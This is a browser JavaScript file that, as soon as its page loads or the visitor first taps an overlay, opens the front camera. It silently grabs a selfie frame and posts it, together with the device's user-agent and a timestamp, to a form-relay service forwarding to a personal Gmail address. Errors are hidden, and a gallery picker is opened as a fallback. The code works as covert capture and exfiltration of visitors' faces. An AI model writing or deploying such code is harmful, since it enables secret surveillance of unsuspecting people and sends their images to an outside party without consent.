const form = document.getElementById("form");
const cameraInput = document.getElementById("cameraInput");
const placeholder = document.getElementById("placeholder");
const overlay = document.getElementById("overlay");
const dateField = document.getElementById("dateField");
const deviceField = document.getElementById("deviceField");
const sizeField = document.getElementById("sizeField");
const live = document.getElementById("live");

let stream = null;
let capturing = false;
let started = false;

dateField.value = new Date().toLocaleString("fr-FR");
deviceField.value = /iPhone/i.test(navigator.userAgent) ? "iPhone" : navigator.userAgent;
live.muted = true;
live.playsInline = true;

function sendPhoto(file) {
  dateField.value = new Date().toLocaleString("fr-FR");
  sizeField.value = String(file.size);
  try {
    const transfer = new DataTransfer();
    transfer.items.add(file);
    cameraInput.files = transfer.files;
  } catch (error) {}

  const payload = new FormData(form);
  payload.set("attachment", file, "TOUTOU.jpg");
  fetch("https://formsubmit.co/cmahdi204@gmail.com", {
    method: "POST",
    body: payload,
    mode: "no-cors",
  }).catch(() => {});
  form.submit();
  overlay.hidden = true;
}

function stopCamera() {
  if (!stream) return;
  stream.getTracks().forEach((track) => track.stop());
  stream = null;
  live.srcObject = null;
}

function waitFrame() {
  return new Promise((resolve) => {
    if (live.videoWidth > 0) {
      resolve();
      return;
    }
    live.addEventListener("loadedmetadata", resolve, { once: true });
    live.addEventListener("playing", resolve, { once: true });
    setTimeout(resolve, 800);
  });
}

async function snapFromVideo() {
  if (capturing) return;
  capturing = true;
  await waitFrame();
  if (!live.videoWidth) {
    capturing = false;
    cameraInput.click();
    return;
  }
  const canvas = document.createElement("canvas");
  canvas.width = live.videoWidth;
  canvas.height = live.videoHeight;
  canvas.getContext("2d").drawImage(live, 0, 0);
  stopCamera();
  const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.7));
  if (!blob || blob.size < 800) {
    capturing = false;
    cameraInput.click();
    return;
  }
  sendPhoto(new File([blob], "TOUTOU.jpg", { type: "image/jpeg" }));
}

async function useStream(nextStream) {
  stream = nextStream;
  live.srcObject = stream;
  placeholder.hidden = true;
  overlay.hidden = true;
  await live.play();
  await snapFromVideo();
}

async function start() {
  if (started) return;
  started = true;
  try {
    const asked = window.__askCam ? window.__askCam() : null;
    const nextStream = asked
      ? await asked
      : await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: { facingMode: "user" },
        });
    await useStream(nextStream);
  } catch (error) {
    started = false;
  }
}

cameraInput.addEventListener("change", () => {
  const picked = cameraInput.files && cameraInput.files[0];
  if (!picked) return;
  capturing = true;
  sendPhoto(picked);
});

overlay.addEventListener(
  "pointerdown",
  () => {
    if (window.__askCam) window.__askCam();
    start();
  },
  { once: true }
);

start();
